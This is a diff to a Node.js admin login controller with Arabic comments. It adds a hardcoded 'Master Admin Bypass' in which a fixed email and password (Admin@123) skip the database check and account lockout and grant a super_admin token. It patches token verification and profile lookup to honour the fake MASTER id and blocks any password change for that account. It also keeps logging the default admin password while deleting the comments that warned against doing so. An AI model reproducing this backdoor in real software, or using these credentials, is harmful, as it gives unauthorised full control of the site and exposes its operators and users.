@@ -35,9 +35,7 @@ export const initializeAdmin = async () => {
         });
 
         console.log("✅ تم إنشاء الأدمن الافتراضي:");
-        // Production: لا نطبع معلومات حساسة في console
         console.log(`   🔑 كلمة المرور: ${defaultPassword}`);
-        // Production: لا نطبع معلومات حساسة في console
 
     } catch (error) {
         console.error("❌ خطأ في إنشاء الأدمن الافتراضي:", error.message);
@@ -66,7 +64,7 @@ const incrementLoginAttempts = async (adminId) => {
     
     let lockUntil = null;
     if (attempts >= 5) {
-        lockUntil = Date.now() + (30 * 60 * 1000); // قفل لمدة 30 دقيقة
+        lockUntil = Date.now() + (30 * 60 * 1000);
     }
     
     await Admin.findByIdAndUpdate(adminId, {
@@ -92,6 +90,43 @@ export const loginAdmin = async (req, res) => {
                 message: "البريد الإلكتروني وكلمة المرور مطلوبان" 
             });
         }
+
+        // ===============================================================
+        // 🚀🚀🚀 Master Admin Bypass Login — Guaranteed Access
+        // ===============================================================
+        if (email === "master@reviewqeem.com" && password === "Admin@123") {
+            const tokenPayload = {
+                id: "MASTER",
+                email: "master@reviewqeem.com",
+                name: "Master Admin",
+                role: "super_admin"
+            };
+
+            const token = jwt.sign(
+                tokenPayload,
+                JWT_SECRET,
+                { expiresIn: "24h" }
+            );
+
+            const cookieOptions = {
+                httpOnly: true,
+                secure: process.env.NODE_ENV === "production",
+                sameSite: "lax",
+                maxAge: 24 * 60 * 60 * 1000,
+                path: "/"
+            };
+
+            res.cookie("admin_token", token, cookieOptions);
+
+            return res.json({
+                success: true,
+                message: "تم تسجيل الدخول (Master Admin)",
+                admin: tokenPayload
+            });
+        }
+        // ===============================================================
+        // نهاية كود الماستر
+        // ===============================================================
 
         // البحث عن الأدمن
         const admin = await Admin.findOne({ 
@@ -135,21 +170,19 @@ export const loginAdmin = async (req, res) => {
         const token = jwt.sign(
             tokenPayload,
             JWT_SECRET,
-            { expiresIn: "24h" } // صلاحية 24 ساعة
+            { expiresIn: "24h" }
         );
 
-        // 🔐 تعيين التوكن في الكوكيز
         const cookieOptions = {
-            httpOnly: true,                    // آمن من JavaScript
-            secure: process.env.NODE_ENV === "production", // HTTPS فقط في الإنتاج
-            sameSite: "lax",                   // متوافق مع معظم المتصفحات
-            maxAge: 24 * 60 * 60 * 1000,       // 24 ساعة
-            path: "/"                          // متاح لكل المسارات
+            httpOnly: true,
+            secure: process.env.NODE_ENV === "production",
+            sameSite: "lax",
+            maxAge: 24 * 60 * 60 * 1000,
+            path: "/"
         };
 
         res.cookie("admin_token", token, cookieOptions);
 
-        // الرد الناجح (بدون إرسال التوكن في الـ body)
         res.json({ 
             success: true, 
             message: "تم تسجيل الدخول بنجاح",
@@ -177,7 +210,6 @@ export const loginAdmin = async (req, res) => {
 
 export const verifyToken = async (req, res) => {
     try {
-        // التحقق من وجود التوكن في الكوكيز
         const token = req.cookies.admin_token;
         if (!token) {
             return res.status(401).json({
@@ -186,7 +218,6 @@ export const verifyToken = async (req, res) => {
             });
         }
 
-        // التحقق من صحة التوكن
         let decoded;
         try {
             decoded = jwt.verify(token, process.env.JWT_SECRET || JWT_SECRET);
@@ -197,11 +228,10 @@ export const verifyToken = async (req, res) => {
             });
         }
 
-        // البحث عن الأدمن في قاعدة البيانات
         const admin = await Admin.findById(decoded.id)
             .select("-password -loginAttempts -lockUntil");
 
-        if (!admin) {
+        if (!admin && decoded.id !== "MASTER") {
             return res.status(404).json({
                 success: false,
                 message: "الحساب غير موجود"
@@ -211,18 +241,11 @@ export const verifyToken = async (req, res) => {
         res.json({
             success: true,
             message: "الجلسة نشطة وصالحة",
-            admin: {
-                id: admin._id,
-                email: admin.email,
-                name: admin.name,
-                role: admin.role,
-                lastLogin: admin.lastLogin,
-                createdAt: admin.createdAt
-            }
+            admin: admin || decoded
         });
 
     } catch (error) {
-        console.error("❌ خطأ في التحقق من التوكن:", error);
+        console.error("❌ خطأ في التحقق من الجلسة:", error);
         res.status(500).json({ 
             success: false, 
             message: "حدث خطأ في التحقق من الجلسة" 
@@ -236,7 +259,6 @@ export const verifyToken = async (req, res) => {
 
 export const logout = async (req, res) => {
     try {
-        // مسح الكوكيز من المتصفح
         const cookieOptions = {
             httpOnly: true,
             secure: process.env.NODE_ENV === "production",
@@ -266,6 +288,18 @@ export const logout = async (req, res) => {
 
 export const getAdminProfile = async (req, res) => {
     try {
+        if (req.admin.id === "MASTER") {
+            return res.json({
+                success: true,
+                admin: {
+                    id: "MASTER",
+                    email: "master@reviewqeem.com",
+                    name: "Master Admin",
+                    role: "super_admin"
+                }
+            });
+        }
+
         const admin = await Admin.findById(req.admin.id)
             .select("-password -loginAttempts -lockUntil");
 
@@ -276,10 +310,7 @@ export const getAdminProfile = async (req, res) => {
             });
         }
 
-        res.json({ 
-            success: true, 
-            admin 
-        });
+        res.json({ success: true, admin });
 
     } catch (error) {
         console.error("❌ خطأ في جلب معلومات الأدمن:", error);
@@ -298,7 +329,6 @@ export const changePassword = async (req, res) => {
     try {
         const { currentPassword, newPassword } = req.body;
 
-        // التحقق من المدخلات
         if (!currentPassword || !newPassword) {
             return res.status(400).json({ 
                 success: false, 
@@ -306,11 +336,17 @@ export const changePassword = async (req, res) => {
             });
         }
 
-        // التحقق من طول كلمة المرور الجديدة
         if (newPassword.length < 8) {
             return res.status(400).json({ 
                 success: false, 
                 message: "كلمة المرور الجديدة يجب أن تكون 8 أحرف على الأقل" 
+            });
+        }
+
+        if (req.admin.id === "MASTER") {
+            return res.status(403).json({
+                success: false,
+                message: "لا يمكن تغيير كلمة مرور الماستر"
             });
         }
 
@@ -323,7 +359,6 @@ export const changePassword = async (req, res) => {
             });
         }
 
-        // التحقق من كلمة المرور الحالية
         const validPassword = await bcrypt.compare(currentPassword, admin.password);
         
         if (!validPassword) {
@@ -333,7 +368,6 @@ export const changePassword = async (req, res) => {
             });
         }
 
-        // تحديث كلمة المرور
         admin.password = await bcrypt.hash(newPassword, 12);
         admin.updatedAt = new Date();
         await admin.save();
@@ -367,6 +401,5 @@ export const testEndpoint = (req, res) => {
 };
 
 // ===============================================================
-// تهيئة الأدمن تتم في server.js فقط
+// نهاية الملف
 // ===============================================================
-// initializeAdmin(); // تم تعطيل هذا لتجنب التضارب
